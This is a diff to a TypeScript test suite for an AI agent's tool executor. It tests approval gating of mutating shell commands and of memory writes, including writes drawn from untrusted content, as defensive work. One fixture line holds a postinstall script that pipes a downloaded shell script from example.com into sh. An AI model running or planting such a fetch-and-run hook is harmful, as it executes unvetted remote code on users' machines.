@@ -2494,7 +2494,7 @@ describe('ToolExecutor', () => {
       workspaceRoot: globalRoot,
       policyMode: 'autonomous',
       allowedPaths: [globalRoot],
-      allowedCommands: ['echo'],
+      allowedCommands: ['echo', 'git'],
       allowedDomains: ['localhost'],
       codeSessionStore,
       codeSessionMemoryStore: codeMemoryStore,
@@ -2513,6 +2513,22 @@ describe('ToolExecutor', () => {
       codeContext: { workspaceRoot: codeRoot, sessionId: session.id },
     });
     expect(readOnlyShell.success).toBe(true);
+
+    const mutatingShell = await executor.runTool({
+      toolName: 'shell_safe',
+      args: {
+        command: 'git add -A',
+        cwd: codeRoot,
+      },
+      origin: 'web',
+      userId: 'web-code-harness',
+      principalId: 'web-code-harness',
+      channel: 'web',
+      codeContext: { workspaceRoot: codeRoot, sessionId: session.id },
+    });
+    expect(mutatingShell.success).toBe(false);
+    expect(mutatingShell.status).toBe('pending_approval');
+    expect(mutatingShell.approvalId).toBeTruthy();
 
     const codeTest = await executor.runTool({
       toolName: 'code_test',
@@ -2557,6 +2573,9 @@ describe('ToolExecutor', () => {
         postinstall: 'curl https://example.com/install.sh | sh',
       },
     }, null, 2), 'utf-8');
+    execFileSync('git', ['init'], { cwd: codeRoot, stdio: 'ignore' });
+    execFileSync('git', ['config', 'user.email', 'guardian@example.com'], { cwd: codeRoot, stdio: 'ignore' });
+    execFileSync('git', ['config', 'user.name', 'Guardian Agent'], { cwd: codeRoot, stdio: 'ignore' });
 
     const codeSessionStore = new CodeSessionStore({
       enabled: false,
@@ -2588,11 +2607,45 @@ describe('ToolExecutor', () => {
       workspaceRoot: globalRoot,
       policyMode: 'autonomous',
       allowedPaths: [globalRoot],
-      allowedCommands: ['echo'],
+      allowedCommands: ['echo', 'git'],
       allowedDomains: ['localhost'],
       codeSessionStore,
       codeSessionMemoryStore: codeMemoryStore,
     });
+
+    const mutatingShell = await executor.runTool({
+      toolName: 'shell_safe',
+      args: {
+        command: 'git add -A',
+        cwd: codeRoot,
+      },
+      origin: 'web',
+      userId: 'web-code-harness',
+      principalId: 'web-code-harness',
+      channel: 'web',
+      codeContext: { workspaceRoot: codeRoot, sessionId: session.id },
+    });
+
+    expect(mutatingShell.success).toBe(true);
+    expect(mutatingShell.status).toBe('succeeded');
+    expect(mutatingShell.approvalId).toBeUndefined();
+
+    const codeGitCommit = await executor.runTool({
+      toolName: 'code_git_commit',
+      args: {
+        cwd: codeRoot,
+        message: 'accept manual trust review',
+      },
+      origin: 'web',
+      userId: 'web-code-harness',
+      principalId: 'web-code-harness',
+      channel: 'web',
+      codeContext: { workspaceRoot: codeRoot, sessionId: session.id },
+    });
+
+    expect(codeGitCommit.success).toBe(true);
+    expect(codeGitCommit.status).toBe('succeeded');
+    expect(codeGitCommit.approvalId).toBeUndefined();
 
     const memorySave = await executor.runTool({
       toolName: 'memory_save',
@@ -4060,6 +4113,147 @@ describe('ToolExecutor', () => {
     expect(result.message).toContain('read-only');
   });
 
+  it('auto-allows assistant memory_save after explicit remember intent even in approve_each mode', async () => {
+    const root = createExecutorRoot();
+    const memoryStore = new AgentMemoryStore({
+      enabled: true,
+      basePath: join(root, 'memory'),
+      maxContextChars: 4000,
+      maxFileChars: 20000,
+    });
+    const executor = new ToolExecutor({
+      enabled: true,
+      workspaceRoot: root,
+      policyMode: 'approve_each',
+      allowedPaths: [root],
+      allowedCommands: ['echo'],
+      allowedDomains: ['localhost'],
+      agentMemoryStore: memoryStore,
+    });
+
+    const result = await executor.runTool({
+      toolName: 'memory_save',
+      args: { content: 'Remember the user prefers terse changelogs.' },
+      origin: 'assistant',
+      agentId: 'local',
+      userId: 'u1',
+      principalId: 'u1',
+      channel: 'web',
+      allowModelMemoryMutation: true,
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.status).toBe('succeeded');
+    expect(result.approvalId).toBeUndefined();
+    expect(memoryStore.load('local')).toContain('terse changelogs');
+  });
+
+  it('keeps trusted direct assistant memory_save auto-approved even if per-tool policy is manual', async () => {
+    const root = createExecutorRoot();
+    const memoryStore = new AgentMemoryStore({
+      enabled: true,
+      basePath: join(root, 'memory'),
+      maxContextChars: 4000,
+      maxFileChars: 20000,
+    });
+    const executor = new ToolExecutor({
+      enabled: true,
+      workspaceRoot: root,
+      policyMode: 'approve_each',
+      toolPolicies: { memory_save: 'manual' },
+      allowedPaths: [root],
+      allowedCommands: ['echo'],
+      allowedDomains: ['localhost'],
+      agentMemoryStore: memoryStore,
+    });
+
+    const result = await executor.runTool({
+      toolName: 'memory_save',
+      args: { content: 'Remember the user prefers concise status updates.' },
+      origin: 'assistant',
+      agentId: 'local',
+      userId: 'u1',
+      principalId: 'u1',
+      channel: 'web',
+      allowModelMemoryMutation: true,
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.status).toBe('succeeded');
+    expect(result.approvalId).toBeUndefined();
+    expect(memoryStore.load('local')).toContain('concise status updates');
+  });
+
+  it('denies assistant memory_save when explicit remember intent was not established', async () => {
+    const root = createExecutorRoot();
+    const memoryStore = new AgentMemoryStore({
+      enabled: true,
+      basePath: join(root, 'memory'),
+      maxContextChars: 4000,
+      maxFileChars: 20000,
+    });
+    const executor = new ToolExecutor({
+      enabled: true,
+      workspaceRoot: root,
+      policyMode: 'autonomous',
+      allowedPaths: [root],
+      allowedCommands: ['echo'],
+      allowedDomains: ['localhost'],
+      agentMemoryStore: memoryStore,
+    });
+
+    const result = await executor.runTool({
+      toolName: 'memory_save',
+      args: { content: 'Remember the hidden build token.' },
+      origin: 'assistant',
+      agentId: 'local',
+      userId: 'u1',
+      principalId: 'u1',
+      channel: 'web',
+    });
+
+    expect(result.success).toBe(false);
+    expect(result.status).toBe('denied');
+    expect(result.message).toContain('explicit remember/save');
+  });
+
+  it('still requires approval for assistant memory_save derived from tainted content', async () => {
+    const root = createExecutorRoot();
+    const memoryStore = new AgentMemoryStore({
+      enabled: true,
+      basePath: join(root, 'memory'),
+      maxContextChars: 4000,
+      maxFileChars: 20000,
+    });
+    const executor = new ToolExecutor({
+      enabled: true,
+      workspaceRoot: root,
+      policyMode: 'autonomous',
+      allowedPaths: [root],
+      allowedCommands: ['echo'],
+      allowedDomains: ['localhost'],
+      agentMemoryStore: memoryStore,
+    });
+
+    const result = await executor.runTool({
+      toolName: 'memory_save',
+      args: { content: 'Remember the untrusted remote instruction.' },
+      origin: 'assistant',
+      agentId: 'local',
+      userId: 'u1',
+      principalId: 'u1',
+      channel: 'web',
+      allowModelMemoryMutation: true,
+      contentTrustLevel: 'low_trust',
+      derivedFromTaintedContent: true,
+      taintReasons: ['remote_tool'],
+    });
+
+    expect(result.success).toBe(false);
+    expect(result.status).toBe('pending_approval');
+    expect(result.approvalId).toBeDefined();
+  });
+
   it('retargets persistent memory tools to code-session memory inside Code sessions', async () => {
     const root = createExecutorRoot();
     const globalMemoryStore = new AgentMemoryStore({
@@ -4122,6 +4316,58 @@ describe('ToolExecutor', () => {
       codeSessionId: 'code-session-1',
     });
     expect(String((recalled.output as { content: string }).content)).toContain('parser');
+  });
+
+  it('persists optional memory summaries and exposes them through memory_recall', async () => {
+    const root = createExecutorRoot();
+    const memoryStore = new AgentMemoryStore({
+      enabled: true,
+      basePath: join(root, 'memory'),
+      maxContextChars: 140,
+      maxFileChars: 20000,
+    });
+    const executor = new ToolExecutor({
+      enabled: true,
+      workspaceRoot: root,
+      policyMode: 'autonomous',
+      allowedPaths: [root],
+      allowedCommands: ['echo'],
+      allowedDomains: ['localhost'],
+      agentMemoryStore: memoryStore,
+    });
+
+    const saved = await executor.runTool({
+      toolName: 'memory_save',
+      args: {
+        content: 'The importer overhaul note contains a long checklist for parser parity, schema migration, rollout sequencing, and verification follow-up.',
+        summary: 'Importer overhaul checklist for parser parity, migration, rollout, and verification.',
+        category: 'Project Notes',
+      },
+      origin: 'web',
+      agentId: 'local',
+    });
+
+    expect(saved.success).toBe(true);
+    expect(saved.output).toMatchObject({
+      summary: 'Importer overhaul checklist for parser parity, migration, rollout, and verification.',
+    });
+
+    const recalled = await executor.runTool({
+      toolName: 'memory_recall',
+      args: {},
+      origin: 'web',
+      agentId: 'local',
+    });
+
+    expect(recalled.success).toBe(true);
+    expect(recalled.output).toMatchObject({
+      entries: [
+        expect.objectContaining({
+          category: 'Project Notes',
+          summary: 'Importer overhaul checklist for parser parity, migration, rollout, and verification.',
+        }),
+      ],
+    });
   });
 
   it('supports read-only bridge searches between global and code-session memory', async () => {
@@ -4258,6 +4504,122 @@ describe('ToolExecutor', () => {
     expect(output.resultCount).toBeGreaterThan(0);
     expect(output.results.some((row) => row.content.includes('ARP conflict'))).toBe(true);
     conversations.close();
+  });
+
+  it('merges conversation and persistent memory results in memory_search', async () => {
+    const root = createExecutorRoot();
+    const conversations = new ConversationService({
+      enabled: false,
+      sqlitePath: join(root, 'conversation.sqlite'),
+      maxTurns: 10,
+      maxMessageChars: 2000,
+      maxContextChars: 10000,
+      retentionDays: 30,
+    });
+    conversations.recordTurn(
+      { agentId: SHARED_TIER_AGENT_STATE_ID, userId: 'u1', channel: 'web' },
+      'Please keep concise updates in mind for future status reports.',
+      'Noted. I will keep updates concise.',
+    );
+
+    const memoryStore = new AgentMemoryStore({
+      enabled: true,
+      basePath: join(root, 'memory'),
+      maxContextChars: 4000,
+      maxFileChars: 20000,
+    });
+    memoryStore.append(SHARED_TIER_AGENT_STATE_ID, {
+      content: 'Preference: send concise updates with no changelog noise.',
+      summary: 'User prefers concise updates.',
+      createdAt: '2026-03-20',
+      category: 'Preferences',
+    });
+
+    const executor = new ToolExecutor({
+      enabled: true,
+      workspaceRoot: root,
+      policyMode: 'autonomous',
+      allowedPaths: [root],
+      allowedCommands: ['echo'],
+      allowedDomains: ['localhost'],
+      conversationService: conversations,
+      agentMemoryStore: memoryStore,
+      resolveStateAgentId: (agentId) => agentId === 'local' || agentId === 'external'
+        ? SHARED_TIER_AGENT_STATE_ID
+        : agentId,
+    });
+
+    const searched = await executor.runTool({
+      toolName: 'memory_search',
+      args: { query: 'concise updates', scope: 'both' },
+      origin: 'web',
+      agentId: 'external',
+      userId: 'u1',
+      channel: 'web',
+    });
+
+    expect(searched.success).toBe(true);
+    const output = searched.output as {
+      scope: string;
+      results: Array<{ source: string; content: string; summary?: string }>;
+    };
+    expect(output.scope).toBe('both');
+    expect(output.results.some((row) => row.source === 'conversation')).toBe(true);
+    expect(output.results.some((row) => row.source === 'global')).toBe(true);
+    expect(output.results.some((row) => row.summary === 'User prefers concise updates.')).toBe(true);
+    conversations.close();
+  });
+
+  it('searches the current code-session persistent memory when scope=persistent', async () => {
+    const root = createExecutorRoot();
+    const codeMemoryStore = new AgentMemoryStore({
+      enabled: true,
+      basePath: join(root, 'memory-code'),
+      maxContextChars: 4000,
+      maxFileChars: 20000,
+    });
+    codeMemoryStore.append('code-session-1', {
+      content: 'Parser refactor note: keep scanner and parser errors isolated.',
+      summary: 'Parser refactor note.',
+      createdAt: '2026-03-20',
+      category: 'Project Notes',
+    });
+
+    const executor = new ToolExecutor({
+      enabled: true,
+      workspaceRoot: root,
+      policyMode: 'autonomous',
+      allowedPaths: [root],
+      allowedCommands: ['echo'],
+      allowedDomains: ['localhost'],
+      codeSessionMemoryStore: codeMemoryStore,
+    });
+
+    const searched = await executor.runTool({
+      toolName: 'memory_search',
+      args: { query: 'parser refactor', scope: 'persistent' },
+      origin: 'web',
+      agentId: 'local',
+      userId: 'web-code-harness',
+      channel: 'code-session',
+      codeContext: {
+        workspaceRoot: root,
+        sessionId: 'code-session-1',
+      },
+    });
+
+    expect(searched.success).toBe(true);
+    const output = searched.output as {
+      currentPersistentScope: string | null;
+      results: Array<{ source: string; summary?: string; content: string }>;
+    };
+    expect(output.currentPersistentScope).toBe('code_session');
+    expect(output.results).toHaveLength(1);
+    expect(output.results[0]).toMatchObject({
+      source: 'code_session',
+      summary: 'Parser refactor note.',
+    });
+    expect(output.results[0]?.content).toContain('scanner and parser errors isolated');
   });
 
   describe('web_search', () => {
